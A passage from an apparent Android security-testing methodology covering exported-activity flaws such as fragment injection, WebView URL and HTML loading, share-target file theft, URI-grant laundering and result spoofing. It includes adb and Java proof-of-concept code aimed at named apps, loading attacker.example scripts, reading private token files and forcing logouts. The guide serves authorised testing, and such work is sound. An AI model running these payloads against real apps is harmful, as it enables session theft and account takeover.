| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) when it prints tokens |
| **Attacker** | AM-03 |
| **Applies to** | all; React Native and Ionic builds specifically |
| **Maps to** | YesWeHack Android recon guide, "Testing exported activities" (`DebugActivity`: "Debug activities often bypass authentication or reveal sensitive internal state"); React Native `devsupport/DevServerHelper.kt` (bundle URL format, `/inspector/device`, `/open-debugger`) |

- **Test:** Analytics event viewers, feature-flag toggles, environment switchers and framework dev menus.
  The severity is set by whether the screen can **flip an environment or API host** — that rewrites where the
  app sends credentials — or only display configuration.
- **How:**
  ```bash
  grep -nE 'android:exported="true"' out/AndroidManifest.xml -B6 \
    | grep -iE 'dev|debug|inspector|test|playground|qa|staging|flag|config|internal'
  adb shell dumpsys package com.target.app | grep -iE 'devsupport|DevSettings|Inspector'
  adb shell am start -n com.target.app/com.facebook.react.devsupport.DevSettingsActivity
  adb shell am start -n com.target.app/.debug.FeatureFlagActivity
  aapt dump badging base.apk | grep -E "versionName|debuggable"
  ```
- **Proof:** The debug screen rendering on a production build — pair the screenshot with the `versionName`
  from `dumpsys package` so the build identity is in the evidence — started from the zero-permission PoC.
- **Escalation:** A dev activity that changes the JS bundle source at runtime is remote code execution in the
  app's UID -> D17. One that rewrites the API host redirects every subsequent credential -> D14/D15. One that
  writes a persisted setting other components trust -> D23.
- **Ruled out when:** The release manifest contains no such component (the dev activities are in the
  `debug` source set and absent from `dumpsys package` on the release build), or each one is
  `exported="false"` and gated on `BuildConfig.DEBUG` — verified by launching it and receiving
  `Permission Denial` or an immediate `finish()`.

### D04-014 · Fragment injection — an exported activity instantiates a class named in an extra

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | the `PreferenceActivity` path is **LEGACY** (API 19 enforces `isValidFragment()`); the extra-driven class-instantiation pattern applies to all API levels |
| **Maps to** | H1 #43988 (Twitter, **$0 — crash only**); mindedsecurity `MSTG-PLATFORM-2_5` and `MSTG-PLATFORM-2_6`; Google ASI campaign "Fragment Injection" (started 2016-11-29), support page `faqs/answer/7188427`; hackwithsingh sec-14-13 #45, sec-14-19 #14 |

- **Test:** `PreferenceActivity` instantiates by reflection whatever class name arrives in
  `:android:show_fragment`. If the activity is exported and does not override `isValidFragment()` — or
  overrides it as `return true` — any app loads any fragment into it. The modern equivalent is any exported
  "router" activity that does `Fragment.instantiate(...)` or `Class.forName(...)` on an intent-derived name.
- **How:**
  ```bash
  grep -rn 'extends PreferenceActivity' out/sources/
  grep -rn 'isValidFragment' out/sources/          # absent, or "return true", is the finding
  grep -rnE 'Fragment\.instantiate|:android:show_fragment|EXTRA_SHOW_FRAGMENT|Class\.forName\(' out/sources/
  adb shell am start -n com.target.app/.SettingsActivity \
    --es ':android:show_fragment' 'com.target.app.internal.DeveloperFragment'
  adb shell dumpsys activity top | grep -i fragment
  ```
- **Proof:** The internal fragment rendering inside the target app (screenshot plus the `dumpsys activity
  top` fragment line). Calibrate honestly: the Twitter report reached only a reflection crash and paid **$0**
  — a crash PoC does not pay; a fragment that discloses credentials or bypasses a gate does.
- **Escalation:** A fragment hosting a WebView -> D10; a debug or settings fragment -> D22/D13, because debug
  fragments routinely print tokens.
- **Ruled out when:** `isValidFragment()` is overridden with a real allow-list (not `return true`), or the
  app targets >= 19 and does not extend `PreferenceActivity` at all, and no exported component reflects on an
  intent-supplied class name. Prove it by sending a class name outside the allow-list and observing the
  documented `IllegalArgumentException` rather than instantiation.

### D04-015 · Exported activity loads an attacker-supplied URL into a WebView

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the loaded origin yields a session token; `broken_access_control.exposed_sensitive_android_intent` (null) otherwise |
| **Attacker** | AM-03; AM-02 where the same activity is `BROWSABLE` |
| **Applies to** | any app with an exported activity that renders web content |
| **Maps to** | H1 #499348 (Twitter Lite, **Critical**), #283058 (IRCCloud, Medium), #2555949 (US DoD, Medium), #532836 (Exness, Low $400), #694053 (Lark, Medium $1000), #414101 (Shipt, $350), #1737358 (Shopify, Low); Yousef Elsheikh `CheckoutActivity` (Oct 2025); B3nac index "Token leakage due to stolen files via unprotected Activity" (H1 #288955) |

- **Test:** The single highest-yield exported-activity shape in the disclosed corpus. An activity reads a
  string extra and calls `loadUrl()` on it with no scheme or host check.
- **How:**
  ```bash
  # locate the sink, then walk backwards to the extra
  grep -rn 'loadUrl(\|loadData(\|loadDataWithBaseURL(' out/sources/ -B15 \
    | grep -nE 'getStringExtra|getIntent|getQueryParameter'
  ```
  Parameter names worth brute-forcing when the build is obfuscated:
  `url, path, link, redirect, page-url, redirect-url, navigate, partner_url, checkoutUrl, orig_uri, auth_url, extra_url, URL`.
  ```bash
  adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity \
    -e title "IRCCloud: Login Required" -e auth_url "http://attacker.example/"
  adb shell am start -n com.target.app/.CheckoutActivity \
    -es "checkoutUrl" "https://attacker.example/x.html"
  # the file:// variant — this is the one that produced the token theft
  adb shell am start -n com.target.app/.CheckoutActivity \
    -es "checkoutUrl" "file:///data/data/com.target.app/files/PersistedInstallation.json"
  adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity \
    -d "javascript://example.com%0A alert(1);"
  ```
  From a remote page (works in WebViews and Firefox; Chrome blocks the selector form):
  ```html
  <a href="intent://app/feedback#Intent;scheme=mymos;package=com.target.app;S.URL=javascript:(function(){alert('XSS')})();end">Open</a>
  ```
- **Proof:** Your server logging a request from the app's WebView User-Agent, **or** the WebView visibly
  rendering the local file you pointed it at. The severity differentiator at triage is **data egress**, not
  `alert(1)`: Elsheikh's `PersistedInstallation.json` held `auth_token`, `refresh_token` and `user_id` in
  cleartext and yielded a full account takeover valid on mobile *and* web.
- **Escalation:** -> D10 for the bridge and the cookie store; -> D11 for the token file; -> D13 for the
  session replay. File the WebView origin-confusion as its own report (D10) and this activity as the
  primitive — see D04-067.
- **Ruled out when:** The activity resolves the extra against a compiled allow-list of hosts before
  `loadUrl`, with the allow-list checked on `Uri.getHost()` (not `contains`/`startsWith` on the raw string),
  **and** `file://`, `javascript:`, `data:` and `content://` are rejected — verified by sending each scheme
  and observing the load refused. An app that simply has no WebView is also a clean negative; say so.

### D04-016 · Exported activity loads an attacker-supplied HTML **body** into a WebView

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | apps whose WebView host activity accepts both a `url` and an `html` extra |
| **Maps to** | H1 #189793 (Quora, Low as filed, with the escalation ladder documented in the report) |

- **Test:** Worse than a URL extra, because the host check is skipped entirely — your markup executes on the
  origin the app chose.
- **How:**
  ```bash
  grep -rn 'loadDataWithBaseURL(\|loadData(' out/sources/ -B12 | grep -nE 'getStringExtra|getIntent'
  adb shell am start -n com.quora.android/com.quora.android.ActionBarContentActivity \
    -e url 'http://test/test' -e html '<script src=//attacker.example></script>'
  adb shell am start -n com.quora.android/com.quora.android.ModalContentActivity \
    -e url 'http://test/test' -e html '<script>alert(QuoraAndroid.getClipboardData());</script>'
  ```
- **Proof:** Your remote script executing **and** a bridge method returning data — #189793 demonstrated
  `QuoraAndroid.getClipboardData()` returning clipboard contents, which is what made it more than a self-XSS.
- **Escalation:** -> D10. The `addJavascriptInterface` reflection-to-RCE variant is **LEGACY** and requires
  minSdk < 17 (pre-`@JavascriptInterface` enforcement); at minSdk >= 17 the impact is confined to the
  annotated bridge methods, which is normally still enough.
- **Ruled out when:** No `loadData`/`loadDataWithBaseURL` call takes an intent-derived string, or the base
  URL passed with it is `null`/`about:blank` so the content is opaque-origin and no bridge is attached —
  verified by enumerating the bridge objects registered on that WebView and finding none.

### D04-017 · Extra re-launched as an external `ACTION_VIEW` — phishing navigation under the app's identity

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `server_side_injection.content_spoofing.external_authentication_injection` (P4); `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | m_kamal finding #3 (`LoginSelectorActivity`, extra `orig_uri`, field `this.onDemandUrl`) |

- **Test:** Distinct from D04-015: here the app launches an *external* navigation the attacker chose, so the
  phishing page appears to have been opened by the trusted app, at the moment the user tapped the app's own
  normal button.
- **How:**
  ```bash
  grep -rn 'ACTION_VIEW' out/sources/ -B10 | grep -nE 'getStringExtra|Uri\.parse'
  adb shell am start -n com.target.library.activities.LoginSelectorActivity \
    --es orig_uri "https://attacker.example/fake-sso"
  ```
- **Proof:** A screen recording in which the app shows its normal UI, the user taps the normal button, and
  the browser opens the attacker URL. The recording is the report's evidence — the static finding alone will
  be read as an open redirect and closed.
- **Escalation:** Chain with a same-app deep link back into the app to complete a credential-phishing loop
  -> D09/D13. Open redirect alone is on the never-submit list; this is only reportable with the
  trusted-context framing and the recording.
- **Ruled out when:** The URI is validated against an allow-list before `startActivity`, or it is passed to
  an in-app browser with a fixed origin. Also ruled out when the app resolves the intent with a package
  restriction so only the app's own component can handle it.

### D04-018 · Flutter `route` / `dart_entrypoint` / `cached_engine_id` extras on an exported `FlutterActivity`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the route renders session data |
| **Attacker** | AM-03 |
| **Applies to** | Flutter apps using `io.flutter.embedding.android.FlutterActivity` (v2 embedding), all current Flutter versions |
| **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` — `EXTRA_INITIAL_ROUTE = "route"`, `EXTRA_DART_ENTRYPOINT = "dart_entrypoint"`, `EXTRA_DART_ENTRYPOINT_ARGS = "dart_entrypoint_args"`, `EXTRA_CACHED_ENGINE_ID = "cached_engine_id"`, `EXTRA_CACHED_ENGINE_GROUP_ID`, `EXTRA_ENABLE_STATE_RESTORATION`; MASTG-TECH-0160 |

- **Test:** `FlutterActivityLaunchConfigs.getInitialRoute()` checks `intent.hasExtra("route")` **first**,
  before manifest metadata. Any exported `FlutterActivity` or subclass — including the default
  `MainActivity` when it carries a `MAIN` or `BROWSABLE` filter — lets a third-party app choose the first
  screen the Dart router renders. Separately, `deepLinkEnabled(metaData)` returns **true when
  `flutter_deeplinking_enabled` is absent**, so a Flutter activity with a `VIEW`/`BROWSABLE` filter hands
  the incoming URI straight to the Dart router with no Java-side allow-listing — which is why testers who
  grep only for Java `getData()` handling wrongly close this surface.
- **How:**
  ```bash
  grep -B5 -A15 'io.flutter.embedding.android.FlutterActivity' out/AndroidManifest.xml
  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.xml || echo "ABSENT -> deep linking is ENABLED"
  # harvest real route names from the Dart snapshot before guessing
  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
  adb shell am start -n com.target.app/com.target.app.MainActivity -e route "/settings/developer"
  adb shell am start -n com.target.app/com.target.app.MainActivity -e route "/account/transfer?to=attacker"
  adb shell am start -n com.target.app/com.target.app.MainActivity -e dart_entrypoint "debugMain"
  adb shell am start -n com.target.app/com.target.app.MainActivity --esa dart_entrypoint_args "--verbose"
  ```
- **Proof:** A screenshot of the target route rendering without passing the login or PIN gate, issued from
  a zero-permission PoC. For the deep-link half, the URI path appearing as the rendered Dart route with no
  validation in the decompiled `MainActivity`.
- **Escalation:** Route injection plus a route that trusts its query parameters is a one-click state change;
  pair with D09 to reach the same route from a browser link, and with D04-006 because the absence of
  `enforceIntentFilter` is what lets a local app supply an *arbitrary* URI to the same activity.
- **Ruled out when:** The Flutter activities are `exported="false"` and the single exported shell validates
  the URI in Java against a host/path allow-list before handing it to Dart, **and**
  `flutter_deeplinking_enabled` is explicitly `false` where deep linking is not wanted. Verify by sending a
  route name outside the app's own table and observing the router refuse it rather than render a blank page.

### D04-019 · Exported start activity destroys the authenticated session

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) if you can hold the user out |
| **Attacker** | AM-03 |
| **Applies to** | apps whose launcher/start activity is `launchMode="singleInstance"` and re-runs startup navigation in `onNewIntent()` |
| **Maps to** | H1 #3764217 (Basecamp, Medium 4.0), #3829030 (Yelp, Low 3.3) |

- **Test:** A `singleInstance` start activity fired externally re-runs its startup navigation and tears down
  the authenticated task. The framing that earned #3764217 its Medium was "reliable and repeatable …
  silent … persistent … no special permissions required".
- **How:**
  ```bash
  grep -nE 'launchMode="singleInstance"' out/AndroidManifest.xml
  # while the app is open and logged in:
  adb shell am start -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \
    --es launchDataUri "https://app.basecamp.com/6217076/projects/47432622"
  # persistence:
  while true; do adb shell am start -n com.target.app/.StartActivity --es launchDataUri "https://…"; sleep 30; done
  ```
- **Proof:** A screen recording showing the app move from an authenticated screen to the sign-in screen
  within the same second, reproducibly, from a caller holding zero permissions.
- **Escalation:** The forced re-login is the pretext for a phishing overlay — combine with D04-047/-050 for
  a credential-capture chain, and with D04-032 if a task hijack is live on the in-scope API levels.
- **Ruled out when:** The start activity checks for an existing session in `onNewIntent` and routes to the
  current screen instead of re-running startup, verified by firing it while authenticated and observing
  `topResumedActivity` unchanged.

### D04-020 · Exported share/receive activity consumes a caller-supplied `EXTRA_STREAM` — and the `/data/user/0/` path-check bypass

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) or `authentication_bypass` (P1) depending on the file |
| **Attacker** | AM-03 |
| **Applies to** | all apps with a `SEND` / `SEND_MULTIPLE` / `GET_CONTENT` receiving activity |
| **Maps to** | H1 #377107 (ownCloud, Medium $750), #161710 (Harvest), #288955 (IRCCloud, **High** — the stolen file held the session token), #258460 (Quora, Medium), #1454002 (ownCloud, $50), #1408692 (Nextcloud) |

- **Test:** Share-target activities take `EXTRA_STREAM` and copy the referenced file somewhere less
  protected — the user's cloud account, public storage, the app's own cache. Point it at the app's own
  private files.
- **How:**
  ```java
  StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().build());  // defeat FileUriExposedException
  Intent intent = new Intent("android.intent.action.SEND");
  intent.setClassName("com.owncloud.android",
      "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
  intent.setType("*/*");
  intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  intent.putExtra("android.intent.extra.STREAM",
      Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
  startActivity(intent);
  ```
  ```bash
  grep -rnE 'EXTRA_STREAM|getParcelableExtra\(|getParcelableArrayListExtra\(' out/sources/ \
    | grep -nE 'openInputStream|FileInputStream|copy'
  ```
- **Proof:** The victim app's private database appearing in the destination the share flow writes to. Name
  the specific file that holds the token — the severity is set by the file, not by the traversal.
- **Escalation:** -> D11 for the token file, -> D07 for the provider path. **The path-check bypass that
  matters:** apps that block `/data/data/` forget the equivalent root. #377107 and #1408692 were both fixed
  with a `startsWith("/data/data/")` check and both bypassed with **`/data/user/0/<pkg>/`**. Always test both
  roots plus `/data/user/<userId>/` for work profiles.
- **Ruled out when:** The activity resolves the URI through `ContentResolver` only, rejects the `file://`
  scheme outright, and canonicalises the path before any allow-list check — verified by sending all three
  roots (`/data/data/…`, `/data/user/0/…`, `/data/user/10/…`) and observing each rejected.

### D04-021 · `android:requireContentUriPermissionFromCaller` absent on an activity that opens a caller-supplied `content://` URI

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | Android 15 / API 35+ for the attribute; the underlying confused deputy works on every version |
| **Maps to** | `guide/topics/manifest/activity-element` (`requireContentUriPermissionFromCaller` values `none` (default) / `read` / `write` / `readOrWrite` / `readAndWrite`, enforced over `Intent.getData()`, `Intent.EXTRA_STREAM` and `Intent.getClipData()`); `about/versions/15/features` (`Context.checkContentUriPermissionFull()`, `ComponentCaller`) |

- **Test:** Android 15 added a manifest-level enforcement that the **caller** must already hold permission
  on any content URI it passes. An exported activity that opens a caller-supplied `content://` URI without
  setting it accepts URIs the caller never had rights to — the classic confused-deputy read, with the
  victim's identity behind it.
- **How:**
  ```bash
  grep -nB4 -A4 'requireContentUriPermissionFromCaller' out/AndroidManifest.xml
  grep -rnE 'getData\(\)|EXTRA_STREAM|getClipData\(\)' out/sources/ | grep -iE 'openInputStream|openFileDescriptor'
  adb shell am start -n com.target.app/.ShareReceiverActivity \
    -a android.intent.action.SEND -t 'text/plain' \
    --eu android.intent.extra.STREAM \
       content://com.target.app.fileprovider/internal/shared_prefs/auth.xml
  ```
- **Proof:** The activity rendering or uploading the contents of a file the *caller* could not read — the
  bytes appearing in the proxy — while a direct `adb shell content read --uri <same>` from the caller's
  context is denied. The contrast is the finding.
- **Escalation:** -> D07 arbitrary content read; chain to a `FileProvider` with an over-broad `<root-path>`.
- **Ruled out when:** The attribute is set to `readOrWrite` or stricter on every URI-consuming activity, or
  the activity calls `Context.checkContentUriPermissionFull()` on the incoming URI before opening it —
  verified by sending a URI the caller does not hold and observing a `SecurityException` in the target's own
  logcat. On a target below API 35 the attribute cannot exist; the correct negative is then a code-level
  check, not the attribute.

### D04-022 · Exported activity returns sensitive data to its caller through `setResult`

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) when the returned value is a session token |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | HackTricks README "Sensitive information leakage — activities can also return results … calling the `setResult` method and returning sensitive information"; Hrishikesh C08; Google Invalid Reports "Intended Behavior" (an export is a vulnerability only when it grants unauthorised access) |

- **Test:** An exported, unprotected activity that calls `setResult(RESULT_OK, intent)` with extras hands
  those extras to whichever app invoked it. Most testers only `startActivity()` and never look at the
  return channel.
- **How:**
  ```bash
  grep -rn 'setResult(' out/sources/ -A4 | grep -nE 'putExtra|getExtras'
  ```
  From the zero-permission PoC:
  ```java
  startActivityForResult(new Intent()
      .setClassName("com.target.app","com.target.app.ExportedActivity"), 1);
  @Override protected void onActivityResult(int req, int res, Intent data) {
      Log.i("poc", "res=" + res + " extras=" + (data == null ? null : data.getExtras()));
  }
  ```
- **Proof:** Your PoC's own logcat tag printing a bundle containing a token, account id, PII or an internal
  URI. Rate on what the bundle holds: High Impact Data (auth tokens, credentials, payment/medical/government
  ID) is High to Critical; Low Impact Data (message content, contacts, photos, call/SMS logs, browsing
  history) is Medium.
- **Escalation:** A returned `content://` URI with grant flags is D04-023. A returned token goes straight to
  -> D13 and, if it works from `curl` off-device, -> D15.
- **Ruled out when:** No exported activity calls `setResult` with a non-empty Intent, or every `setResult`
  payload is a boolean/enum with no identifier in it — verified by reading each call site and by the PoC
  receiving `res=0` (`RESULT_CANCELED`) with `data == null`.

### D04-023 · Full-intent echo — `setResult(RESULT_OK, getIntent())` launders URI grants

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rate on the provider reached |
| **Attacker** | AM-03 |
| **Applies to** | all; the victim's own providers become reachable only where `android:grantUriPermissions="true"` (the `<provider>` default for that attribute is `"false"`) |
| **Maps to** | Oversecured, "Gaining access to arbitrary Content Providers" (four vectors: direct intent return, intent interception, intent manipulation, permission escalation); `risks/intent-redirection` (flag-clearing mitigation list); AOSP §4.3.1 URI permission grants |

- **Test:** A one-line pattern with disproportionate impact. The activity hands you back an Intent whose
  grant flags the framework then honours **on your behalf**. Oversecured's rule: "if it does have access
  rights, then the same rights are transferred to the app to which the Intent is passed." Oversecured chained
  exactly this in TikTok up to arbitrary code execution.
- **How:**
  ```bash
  grep -rn 'setResult(-1, getIntent())\|setResult(.*, *getIntent())' out/sources/
  grep -rn 'setResult(' out/sources/ -A2 | grep -n 'getIntent()'
  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/
  ```
  From the attacker activity:
  ```java
  Intent i = new Intent().setClassName("com.target.app","com.target.app.EchoActivity");
  i.setData(Uri.parse("content://com.target.app.provider/secret_data.txt"));   // or content://com.android.contacts/data
  i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  startActivityForResult(i, 0);
  // onActivityResult: getContentResolver().openInputStream(data.getData())
  ```
- **Proof:** `openInputStream()` returning bytes your app has no permission to read, dumped to your own
  logcat — while the identical call without the round-trip throws `SecurityException`. That contrast is the
  finding.
- **Escalation:** -> D07 provider read/write; the same mechanism reaches the victim's *dangerous-permission*
  data (`READ_CONTACTS`, `READ_SMS`-scoped providers) without holding the permission; a write path goes to
  -> D17 native-library overwrite.
- **Ruled out when:** Every exported activity that returns a result builds a **fresh** Intent and never
  echoes `getIntent()`, and calls `removeFlags(FLAG_GRANT_READ_URI_PERMISSION | FLAG_GRANT_WRITE_URI_PERMISSION
  | FLAG_GRANT_PERSISTABLE_URI_PERMISSION | FLAG_GRANT_PREFIX_URI_PERMISSION)` (or uses
  `androidx.core.content.IntentSanitizer`) before returning. Verify by attempting the read above and
  receiving `SecurityException`.

### D04-024 · Activity result spoofing — the app trusts whatever an implicit responder returns

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); rate on the sink |
| **Attacker** | AM-03 |
| **Applies to** | all apps calling `startActivityForResult`/`registerForActivityResult` with an implicit Intent |
| **Maps to** | MHL Defense Checklist ("Validate all data received in `onNewIntent()` and `onActivityResult()`"); MASTG-TECH-0164 |

- **Test:** The inverse direction of D04-022: the *victim* fires an implicit `ACTION_PICK` /
  `ACTION_GET_CONTENT` / `ACTION_IMAGE_CAPTURE` / OAuth-picker intent and trusts whatever comes back. A
  malicious activity registered for the same action returns a forged result and the victim consumes it.
- **How:**
  ```bash
  grep -rnE 'startActivityForResult\(|registerForActivityResult\(' out/sources/ -A3 \
    | grep -nE 'ACTION_PICK|ACTION_GET_CONTENT|ACTION_IMAGE_CAPTURE|new Intent\("'
  grep -rn 'onActivityResult' out/sources/ -A25 \
    | grep -nE 'getStringExtra|getData\(\)|RESULT_OK|== *-1'
  # discover every app that will answer the same implicit intent
  dz> run app.activity.forintent --action android.intent.action.PICK --data content://x
  ```
  The attacker responder, registered with a high-priority filter for the same action:
  ```java
  setResult(-1, new Intent()
      .putExtra("picked_url", "https://attacker.example/")
      .setData(Uri.parse("file:///data/user/0/com.victim/shared_prefs/secrets.xml")));
  finish();
  ```
- **Proof:** The victim consuming the injected value — the attacker URL loaded into the victim's WebView
  **with auth headers attached**, or the victim copying your `file://` URI into a location you can read.
  Show the victim's own outbound request carrying it.
- **Escalation:** -> D10 (attacker origin in a bridged WebView -> token theft -> ATO); -> D07 where the
  returned URI is a path into the victim's private storage. Note the **BAL gate** in D04-038: on API 34+ the
  victim must have a visible window when it acts on your result.
- **Ruled out when:** `onActivityResult` validates `requestCode` **and** the returned data's scheme and
  authority against an allow-list, and — for privileged flows — verifies the responder's identity rather than
  trusting `resultCode == RESULT_OK`. Prove it by returning a `file://` URI and an off-allow-list host and
  observing both rejected.

### D04-025 · `FLAG_ACTIVITY_FORWARD_RESULT` — the result is delivered to a recipient you chose

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
| **Attacker** | AM-03 |
| **Applies to** | activities that return results and can be started in the same task |
| **Maps to** | drozer Intent flag map verified in `src/drozer/android.py`: `ACTIVITY_FORWARD_RESULT 0x02000000` |

- **Test:** `FLAG_ACTIVITY_FORWARD_RESULT` makes the new activity return its result to the *original*
  requester rather than to the immediate caller. Against an app that chains activities for a result, this
  lets you re-point the return channel; against an app that uses it internally, it means the recipient of a
  sensitive result is not the component the developer assumed.
- **How:**
  ```bash
  grep -rn 'FLAG_ACTIVITY_FORWARD_RESULT\|0x02000000' out/sources/
  adb shell am start -n com.target.app/.ResultActivity -f 0x02000000
  ```
  ```
  dz> run app.activity.start --component com.target.app com.target.app.ResultActivity \
        --flags ACTIVITY_FORWARD_RESULT
  ```
- **Proof:** The result Intent arriving in a component that never called `startActivityForResult` for it —
  observed with a Frida hook on `Activity.onActivityResult` printing the receiving class, or in your PoC's
  own `onActivityResult`.
- **Escalation:** Most impactful against the activities identified in D04-022 and D04-023, because it changes
  *who* receives the leaked extras or the laundered URI grant.
- **Ruled out when:** No exported activity calls `setResult` (so there is nothing to forward), or every
  internal result chain is built with explicit components inside a single task the caller cannot join —
  verified by launching with the flag and observing the result land where it should.

### D04-026 · `getCallingActivity()` / `getCallingPackage()` used as an authentication signal

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the guarded branch is the auth gate |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` — "Checking `getCallingActivity()` returns non-null" is listed verbatim as a common mistake, and "Malicious apps can supply null"; `risks/access-control-to-exported-components` |

- **Test:** Treating a non-null `getCallingActivity()` as proof of a trusted caller. It is populated only for
  `startActivityForResult()`, it is attacker-controlled in content, and an attacker can make it null at will
  by using `startActivity()` instead. Either branch may be the privileged one — test both.
- **How:**
  ```bash
  grep -rn 'getCallingActivity\|getCallingPackage' out/sources/ -A8
  ```
  From the PoC, invoke both ways and log which branch ran:
  ```java
  startActivity(i);                 // getCallingActivity() == null
  startActivityForResult(i, 1);     // getCallingActivity() == your component
  ```
  Hook the branch to see it directly:
  ```bash
  frida -U -n com.target.app -e 'Java.perform(function(){var A=Java.use("com.target.app.GateActivity");A.isTrustedCaller.implementation=function(){var r=this.isTrustedCaller();console.log("isTrustedCaller -> "+r);return r;};});'
  ```
- **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted
  package, with the branch logged.
- **Escalation:** -> D13/D15 auth bypass. The correct construction, worth naming in the remediation, is
  `Binder.getCallingUid()` inside a Service or ContentProvider (D06/D07) followed by
  `PackageManager.getPackagesForUid()` **plus a signature check** — an activity simply cannot obtain a
  trustworthy caller identity before API 35's `ComponentCaller`.
- **Ruled out when:** The activity performs no caller-identity check at all and instead relies on a
  `signature`-level `android:permission` (a real control), or it uses `ComponentCaller`/`getCallingPackage()`
  only for telemetry with no branch depending on it — verified by invoking both ways and observing identical
  behaviour.

### D04-027 · `checkCallingPermission()` called as if it threw — the return value is discarded

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) where the ignored check was the only gate |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | `risks/intent-redirection` — "Assuming `checkCallingPermission()` always throws exceptions (it returns an integer)"; `risks/access-control-to-exported-components` |

- **Test:** `checkCallingPermission()` and `checkCallingOrSelfPermission()` return an `int`
  (`PackageManager.PERMISSION_GRANTED` / `PERMISSION_DENIED`). Code that calls one and does not compare the
  result has no check at all. The throwing variants are `enforceCallingPermission()` /
  `enforceCallingOrSelfPermission()`.
- **How:**
  ```bash
  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' out/sources/
  # the smoking gun: the call on its own statement line
  grep -rnE 'checkCalling(OrSelf)?Permission\([^)]*\)\s*;' out/sources/
  # and the guards that *should* be there
  grep -rnE 'enforceCallingPermission|enforceCallingOrSelfPermission' out/sources/
  ```
- **Proof:** A decompiled statement `checkCallingPermission("com.target.PRIVILEGED");` on its own line,
  followed by the privileged action executing unconditionally — then the action demonstrated from a stub app
  that does **not** hold that permission.
- **Escalation:** The guard the developer believes exists does nothing, so every item from D04-007 onwards
  applies to that component as if it were unprotected.
- **Ruled out when:** Every `check*Permission` result is compared against `PERMISSION_GRANTED` and the
  denial branch returns before the sensitive work, or the component uses the `enforce*` variants — verified
  by calling from a package without the permission and observing `SecurityException` or a clean refusal.

### D04-028 · `singleTask` / `singleTop` re-delivery — `onNewIntent` re-drives an already-authenticated screen

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) for cross-user reads; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when it also writes |
| **Attacker** | AM-03 |
| **Applies to** | all; `launchMode` in `singleTop`, `singleTask`, `singleInstance`, `singleInstancePerTask` |
| **Maps to** | `guide/components/activities/tasks-and-back-stack`; `guide/topics/manifest/activity-element` (launchMode table); MHL Defense Checklist |

- **Test:** `singleTask` reuses the existing instance and destroys everything above it, delivering the new
  intent to `onNewIntent()`; `singleTop` does the same when already on top. If the activity's security state
  was established in `onCreate()` but `onNewIntent()` re-reads attacker extras, a second caller re-drives an
  authenticated screen with new parameters — a BOLA in UI form.
- **How:**
  ```bash
  grep -nE 'launchMode="(singleTask|singleTop|singleInstance|singleInstancePerTask)"' out/AndroidManifest.xml
  grep -rn 'onNewIntent' out/sources/ -A25
  # drive it twice: first legitimately, then hostile
  adb shell am start -n com.target.app/.OrderActivity --el orderId 100001
  adb shell am start -n com.target.app/.OrderActivity --el orderId 999999 --ez isAdmin true
  ```
- **Proof:** The screen re-rendering with another user's record, or an admin-only control appearing —
  captured on screen **plus** the corresponding backend request and its `200` in the proxy.
- **Escalation:** -> D15 to confirm the IDOR against the API directly; -> D08 if the re-delivered intent is
  forwarded onward.
- **Ruled out when:** `onNewIntent` calls `setIntent(intent)` and then re-runs the same validation path as
